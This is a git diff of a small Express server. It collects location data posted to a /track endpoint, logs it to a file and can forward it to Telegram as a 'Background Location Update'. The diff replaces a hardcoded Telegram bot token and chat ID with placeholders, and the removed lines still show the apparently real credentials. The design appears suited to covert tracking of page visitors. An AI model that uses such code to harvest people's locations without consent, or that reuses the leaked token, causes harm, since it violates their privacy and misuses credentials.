@@ -9,25 +9,28 @@ const PORT = 5000;
 // Middleware
 app.use(bodyParser.json());
 
+// ✅ Serve only public folder
+app.use(express.static(path.join(__dirname, 'public')));
+
 // Track endpoint
 app.post('/track', (req, res) => {
     const locationData = req.body;
     const logEntry = `${new Date().toISOString()} - ${JSON.stringify(locationData)}\n`;
-    
+
     // Log to file
     fs.appendFile('locations.log', logEntry, (err) => {
         if (err) console.error('Error writing to log file:', err);
     });
-    
-    // You can also send to Telegram here if needed
+
+    // Optionally send to Telegram
     // sendToTelegram(locationData);
-    
+
     res.status(200).send('Location received');
 });
 
-// Serve the HTML file
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+// ✅ Agar koi bhi route match na ho, default index.html dega
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 // Start server
@@ -37,15 +40,15 @@ app.listen(PORT, '0.0.0.0', () => {
 
 // Function to send to Telegram (optional)
 async function sendToTelegram(locationData) {
-    const BOT_TOKEN = "7659085089:AAGTE5B4NRLG_tFvbfYayfrG0URgFgXnv5w";
-    const CHAT_ID = "6319619567";
-    
-    const message = `📍 **Background Location Update**  
-Latitude: ${locationData.latitude}  
-Longitude: ${locationData.longitude}  
-Accuracy: ${locationData.accuracy}m  
+    const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
+    const CHAT_ID = "YOUR_CHAT_ID";
+
+    const message = `📍 **Background Location Update**
+Latitude: ${locationData.latitude}
+Longitude: ${locationData.longitude}
+Accuracy: ${locationData.accuracy}m
 Time: ${new Date().toLocaleString()}`;
-    
+
     try {
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -56,7 +59,7 @@ Time: ${new Date().toLocaleString()}`;
                 parse_mode: 'Markdown'
             })
         });
-        
+
         const data = await response.json();
         if (!data.ok) {
             console.error('Telegram API error:', data.description);
@@ -65,3 +68,4 @@ Time: ${new Date().toLocaleString()}`;
         console.error('Error sending to Telegram:', error);
     }
 }
+
